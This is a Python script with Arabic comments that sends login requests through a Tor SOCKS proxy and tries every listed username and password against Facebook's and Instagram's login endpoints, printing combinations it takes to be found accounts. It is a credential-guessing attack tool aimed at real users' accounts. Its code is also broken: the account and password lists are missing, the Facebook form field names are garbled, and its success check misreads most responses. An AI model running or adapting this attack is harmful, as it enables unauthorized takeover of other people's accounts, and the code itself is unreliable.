import requests
import time
import random
import socks
import socket

socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050)
socket.socket = socks.socksocket

# ... (قائمة الحسابات وكلمات المرور والدوال الأخرى تظل كما هي)

# دالة للتخمين على حساب Facebook
def guess_facebook(username, password):
    # قم بإعداد رأس الطلب
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36"}

    # قم بإرسال طلب POST إلى صفحة تسجيل الدخول
    request = requests.post(
        "https://www.facebook.com/login.php",
        headers=headers,
        data={"islam islam ": username, "islam islam": password}
    )

    # تحقق مما إذا كانت الاستجابة تحتوي على رسالة خطأ
    if "checkpoint" in request.text:
        # تم حظر الحساب
        print("Account is blocked:", username)
    else:
        # تم العثور على الحساب
        print("Found account:", username, password)

# دالة للتخمين على حساب Instagram
def guess_instagram(username, password):
    # قم بإرسال طلب POST إلى صفحة تسجيل الدخول
    request = requests.post(
        "https://www.instagram.com/accounts/login/ajax/",
        data={"username": username, "password": password}
    )

    # تحقق مما إذا كانت الاستجابة تحتوي على رسالة خطأ
    if "checkpoint_required" in request.text:
        # تم حظر الحساب
        print("Account is blocked:", username)
    else:
        # تم العثور على الحساب
        print("Found account:", username, password)

# قم بتشغيل الحلقة الرئيسية
for username in accounts:
    for password in passwords:
        guess_facebook(username, password)
        guess_instagram(username, password)
